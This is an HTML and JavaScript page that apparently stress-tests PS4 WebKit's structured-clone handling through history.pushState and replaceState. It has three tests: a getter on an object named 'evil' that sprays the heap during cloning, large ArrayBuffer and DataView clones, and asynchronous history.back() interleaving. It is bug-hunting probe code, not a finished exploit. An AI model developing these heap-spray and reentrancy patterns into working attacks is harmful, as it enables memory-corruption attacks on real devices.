<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 WebKit - T6 T7 T8 Structured Clone Stress</title>
<style>
body { font-family: monospace; background:#000; color:#0f0; }
button { margin: 5px; padding: 10px; }
#log { white-space: pre-wrap; }
</style>
</head>

<body>

<h2>PS4 WebKit – Structured Clone Advanced Tests</h2>

<button onclick="runT6()">T6 – Getter Reentrancy</button>
<button onclick="runT7()">T7 – ArrayBuffer / DataView Clone</button>
<button onclick="runT8()">T8 – pushState + history.back Interleave</button>

<div id="log"></div>

<script>
const logEl = document.getElementById("log");
function log(m) {
    logEl.textContent += m + "\n";
}

/* =======================
   COMMON BASELINE
======================= */

function baselineSizes(iter) {
    return 977 + (14461 * iter);
}

/* =======================
   T6 – Getter Reentrancy
======================= */

function runT6() {
    log("===== T6 START (Getter Reentrancy) =====");

    for (let i = 0; i < 50; i++) {
        let size = baselineSizes(i);
        log(`[T6] ITER ${i} size=${size}`);

        let evil = {
            idx: i,
            get payload() {
                log(`[T6] >>> getter HIT @ ITER ${i}`);
                let spray = new Array(200);
                for (let j = 0; j < spray.length; j++) {
                    spray[j] = "G".repeat(1024);
                }
                log(`[T6] >>> getter returning payload length=${size}`);
                return "A".repeat(size);
            }
        };

        log("[T6] pushState()");
        history.pushState(evil, "", "#T6_" + i);

        log("[T6] replaceState()");
        history.replaceState(evil, "", "#T6r_" + i);
    }

    log("===== T6 END =====");
}

/* =======================
   T7 – ArrayBuffer / DataView
======================= */

function runT7() {
    log("===== T7 START (ArrayBuffer/DataView) =====");

    for (let i = 0; i < 50; i++) {
        let size = baselineSizes(i);
        log(`[T7] ITER ${i} size=${size}`);

        log("[T7] Allocating ArrayBuffer");
        let ab = new ArrayBuffer(size);
        let dv = new DataView(ab);

        for (let j = 0; j < Math.min(64, size); j++) {
            dv.setUint8(j, 0x41);
        }

        let obj = {
            iter: i,
            buf: ab,
            view: dv,
            marker: "B".repeat(64)
        };

        log("[T7] pushState()");
        history.pushState(obj, "", "#T7_" + i);

        log("[T7] replaceState()");
        history.replaceState(obj, "", "#T7r_" + i);
    }

    log("===== T7 END =====");
}

/* =======================
   T8 – pushState + back Interleave
======================= */

function runT8() {
    log("===== T8 START (Interleaved back) =====");

    for (let i = 0; i < 50; i++) {
        let size = baselineSizes(i);
        log(`[T8] ITER ${i} size=${size}`);

        let payload = {
            i: i,
            data: "C".repeat(size),
            flag: true
        };

        log("[T8] pushState()");
        history.pushState(payload, "", "#T8_" + i);

        log("[T8] replaceState()");
        history.replaceState(payload, "", "#T8r_" + i);

        if (i % 3 === 0) {
            log("[T8] history.back() ASYNC scheduled");
            setTimeout(() => {
                history.back();
            }, 0);
        }
    }

    log("===== T8 END =====");
}

/* =======================
   LOAD
======================= */

log("Page loaded. Ready.");
</script>

</body>
</html>

